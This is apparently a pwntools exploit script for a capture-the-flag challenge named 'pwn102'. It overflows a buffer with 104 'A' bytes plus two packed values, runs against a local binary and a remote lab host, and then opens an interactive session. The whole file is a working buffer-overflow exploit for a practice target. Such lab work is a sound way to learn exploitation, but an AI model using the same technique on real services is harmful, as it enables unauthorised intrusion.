from pwn import *
from time import *

def local():
    p = process("./pwn.pwn102")

    print(p.recvuntil("right?").decode())
    ## r < <(python -c 'from pwn import *;sys.stdout.buffer.write(104 * b"A" + p32(0x00c0d3) + p32(0xc0ff33) )')
    p.sendline(104 * b"A" + p32(0x00c0d3)+ p32(0xc0ff33))
    print(p.recvline().decode())
    p.interactive()


def remote_pwn():
    p = remote("10.10.168.103", 9002)
    print(p.recvuntil("right?").decode())
    ## r < <(python -c 'from pwn import *;sys.stdout.buffer.write(104 * b"A" + p32(0x00c0d3) + p32(0xc0ff33) )')
    p.sendline(104 * b"A" + p32(0x00c0d3)+ p32(0xc0ff33))
    print(p.recvline().decode())
    p.interactive()
remote_pwn()
local()